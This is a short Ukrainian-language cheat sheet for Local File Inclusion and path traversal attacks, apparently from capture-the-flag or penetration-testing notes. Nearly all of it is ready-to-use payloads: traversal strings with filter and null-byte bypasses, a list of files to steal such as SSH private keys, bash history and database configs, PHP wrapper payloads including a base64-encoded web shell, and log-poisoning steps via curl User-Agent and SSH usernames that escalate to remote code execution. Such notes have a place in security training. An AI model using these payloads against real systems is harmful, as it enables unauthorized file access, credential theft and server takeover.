# Cheatsheet: LFI / Path Traversal

Читання довільних файлів через параметр (`?file=`, `?page=`, `?lang=`). ← [web-enum](../02-workflows/web-enum.md)

## Базове читання
```
?file=../../../../etc/passwd
?file=....//....//etc/passwd            # обхід фільтра одного рівня
?file=/etc/passwd                        # абсолютний шлях
?file=../../../../etc/passwd%00          # null-byte (старий PHP)
```

## Цінні файли (Linux)
| Файл | Що дає |
|---|---|
| `/etc/passwd` | список юзерів (підтвердити LFI) |
| `/home/<user>/.ssh/id_rsa` | приватний ключ → SSH |
| `/home/<user>/.bash_history` | команди/паролі |
| `/var/www/html/config.php` | БД-креди |
| `/etc/apache2/sites-enabled/000-default.conf` | веб-корінь/vhosts |
| `/proc/self/environ` | env (інколи креди) |
| `/var/log/apache2/access.log` | для log poisoning → RCE |

## PHP-обгортки (читати сорс/виконувати)
```
# прочитати сирцевий PHP у base64 (не виконуючи):
?file=php://filter/convert.base64-encode/resource=index.php
# decode: echo '<b64>' | base64 -d
# data-wrapper RCE (якщо allow_url_include):
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   # <?php system($_GET['c']);?>
&c=id
# input-wrapper:
?file=php://input   (POST body = <?php system('id');?>)
```

## LFI → RCE
1. **Log poisoning:** PHP у User-Agent → читання логу через LFI.
   ```bash
   curl -A '<?php system($_GET["c"]);?>' http://$TARGET/
   # потім: ?file=/var/log/apache2/access.log&c=id
   ```
2. **SSH log:** логін з юзернеймом `<?php system($_GET["c"]);?>` → читання `/var/log/auth.log`.
3. **id_rsa:** прочитаний ключ → `ssh -i`.

## Автоматизація fuzz
```bash
ffuf -u "http://$TARGET/?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
```

## Пастки/читання
- `/etc/passwd` читається → LFI підтверджено, далі по цінних файлах.
- Фільтр `../` → `....//`, абсолютні шляхи, обгортки.
- Traversal дає й не-PHP файли (бекапи, конфіги, ключі) — часто там прапорці (зразок `lf1_c0nf1g_s0urc3`).
